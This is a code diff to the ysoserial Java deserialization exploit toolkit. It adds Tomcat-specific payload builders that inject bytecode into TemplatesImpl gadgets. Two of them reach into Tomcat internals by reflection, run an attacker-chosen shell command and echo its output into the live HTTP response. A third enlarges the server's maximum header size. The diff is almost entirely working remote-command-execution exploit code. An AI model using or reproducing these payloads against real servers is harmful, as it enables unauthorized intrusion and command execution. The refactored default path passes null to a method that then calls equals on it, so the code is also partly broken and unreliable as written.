@@ -1,22 +1,6 @@
 package ysoserial.payloads.util;
 
 
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-
-import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.util.HashMap;
-import java.util.Map;
-
-import com.nqzero.permit.Permit;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -24,6 +8,16 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import java.io.Serializable;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 
 /*
@@ -90,21 +84,175 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+    public static Object createTemplatesImplTomcatHeader(final String command) throws Exception {
+        String template = "try {\n" +
+            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
+            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
+            "            contextField.setAccessible(true);\n" +
+            "            serviceField.setAccessible(true);\n" +
+            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
+            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
+            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
+            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
+            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
+            "            for (int i=0;i<connectors.length;i++) {\n" +
+            "                if (4==connectors[i].getScheme().length()) {\n" +
+            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                   if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n"+
+            "                    ((org.apache.coyote.http11.AbstractHttp11Protocol)protocolHandler).setMaxHttpHeaderSize("+command+");\n" +
+            "                   }\n"+
+            "                }\n" +
+            "            }\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
+
+
+    public static Object createTemplatesImplTomcatEcho2(final String command) throws Exception {
+
+        String template = "try {\n" +
+            "            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(\"context\");\n" +
+            "            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(\"service\");\n" +
+            "            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(\"req\");\n" +
+            "            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(\"getHandler\",null);" +
+            "            contextField.setAccessible(true);\n" +
+            "            serviceField.setAccessible(true);\n" +
+            "            requestField.setAccessible(true);\n" +
+            "            getHandlerMethod.setAccessible(true);\n" +
+            "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =\n" +
+            "                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();\n" +
+            "            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());\n" +
+            "            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);\n" +
+            "            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();\n" +
+            "            for (int i=0;i<connectors.length;i++) {\n" +
+            "                if (4==connectors[i].getScheme().length()) {\n" +
+            "                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();\n" +
+            "                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {\n" +
+            "                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();\n" +
+            "                        for (int j = 0; j < classes.length; j++) {\n" +
+            "                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {\n" +
+            "                                java.lang.reflect.Field globalField = classes[j].getDeclaredField(\"global\");\n" +
+            "                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField(\"processors\");\n" +
+            "                                globalField.setAccessible(true);\n" +
+            "                                processorsField.setAccessible(true);\n" +
+            "                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));\n" +
+            "                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);\n" +
+            "                                for (int k = 0; k < list.size(); k++) {\n" +
+            "                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));\n" +
+            "                                    if (\"tomcat\".equals(tempRequest.getHeader(\"tomcat\"))) {\n" +
+            "                                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);\n" +
+            "                                        String cmd = \"" + command+"\";\n" +
+            "                                        String[] cmds = !System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
+            "                                        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
+            "                                        java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
+            "                                        String output = s.hasNext() ? s.next() : \"\";\n" +
+            "                                        java.io.Writer writer = request.getResponse().getWriter();\n" +
+            "                                        java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField(\"usingWriter\");\n" +
+            "                                        usingWriter.setAccessible(true);\n" +
+            "                                        usingWriter.set(request.getResponse(), Boolean.FALSE);\n" +
+            "                                        writer.write(output);\n" +
+            "                                        writer.flush();\n" +
+            "                                        break;\n" +
+            "                                    }\n" +
+            "                                }\n" +
+            "                                break;\n" +
+            "                            }\n" +
+            "                        }\n" +
+            "                    }\n" +
+            "                    break;\n" +
+            "                }\n" +
+            "            }\n" +
+            "        }catch (Exception e){\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
+
+
+    public static Object createTemplatesImplTomcatEcho(final String command) throws Exception {
+        String param = command == null ? "cmd" : command;
+        String template = "        try {\n" +
+            "            java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");\n" +
+            "            java.lang.reflect.Field lastServicedRequestField = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(\"lastServicedRequest\");\n" +
+            "            java.lang.reflect.Field lastServicedResponseField = org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(\"lastServicedResponse\");\n" +
+            "            java.lang.reflect.Field modifiersField = java.lang.reflect.Field.class.getDeclaredField(\"modifiers\");\n" +
+            "            modifiersField.setAccessible(true);\n" +
+            "            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, 8);\n" +
+            "            modifiersField.setInt(lastServicedRequestField, 10);\n" +
+            "            modifiersField.setInt(lastServicedResponseField, 10);\n" +
+            "            WRAP_SAME_OBJECT_FIELD.setAccessible(true);\n" +
+            "            lastServicedRequestField.setAccessible(true);\n" +
+            "            lastServicedResponseField.setAccessible(true);\n" +
+            "\n" +
+            "            ThreadLocal lastServicedResponse = lastServicedResponseField.get(null) != null\n" +
+            "                    ? (ThreadLocal) lastServicedResponseField.get(null)\n" +
+            "                    : null;\n" +
+            "            ThreadLocal lastServicedRequest = lastServicedRequestField.get(null) != null\n" +
+            "                    ? (ThreadLocal) lastServicedRequestField.get(null)\n" +
+            "                    : null;\n" +
+            "            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);\n" +
+            "            String cmd = lastServicedRequest != null\n" +
+            "                    ? ((javax.servlet.ServletRequest) lastServicedRequest.get()).getParameter(\"" + command + "\")\n" +
+            "                    : null;\n" +
+            "            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {\n" +
+            "                lastServicedRequestField.set(null, new ThreadLocal());\n" +
+            "                lastServicedResponseField.set(null, new ThreadLocal());\n" +
+            "                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);\n" +
+            "            } else if (cmd != null) {\n" +
+            "                javax.servlet.ServletResponse responseFacade = (javax.servlet.ServletResponse) lastServicedResponse.get();\n" +
+            "                responseFacade.getWriter();\n" +
+            "                java.io.Writer w = responseFacade.getWriter();\n" +
+            "                java.lang.reflect.Field responseField = org.apache.catalina.connector.ResponseFacade.class.getDeclaredField(\"response\");\n" +
+            "                responseField.setAccessible(true);\n" +
+            "                org.apache.catalina.connector.Response response = (org.apache.catalina.connector.Response) responseField.get(responseFacade);\n" +
+            "                java.lang.reflect.Field usingWriter = org.apache.catalina.connector.Response.class.getDeclaredField(\"usingWriter\");\n" +
+            "                usingWriter.setAccessible(true);\n" +
+            "                usingWriter.set((Object) response, Boolean.FALSE);\n" +
+            "\n" +
+            "                boolean isLinux = true;\n" +
+            "                String osTyp = System.getProperty(\"os.name\");\n" +
+            "                if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
+            "                    isLinux = false;\n" +
+            "                }\n" +
+            "                String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
+            "                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
+            "                java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
+            "                String output = s.hasNext() ? s.next() : \"\";\n" +
+            "                w.write(output);\n" +
+            "                w.flush();\n" +
+            "            }\n" +
+            "        } catch (Exception e) {\n" +
+            "        }";
+        return createTemplatesImpl(command, template);
+    }
+
+
+    public static  Object createTemplatesImpl(final String command) throws Exception{
+        return createTemplatesImpl(command, null);
+    }
+
+    public static Object createTemplatesImpl(final String command, String template) throws Exception {
+        if (template.equals("")) {
+            template = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+        }
+
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
                 command,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
+                template);
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, template);
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
-            throws Exception {
+    public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template)
+        throws Exception {
         final T templates = tplClass.newInstance();
 
         // use template gadget class
@@ -114,10 +262,8 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
+
+        clazz.makeClassInitializer().insertAfter(template);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
@@ -126,7 +272,7 @@ public class Gadgets {
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
             classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
@@ -135,6 +281,7 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
+
 
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
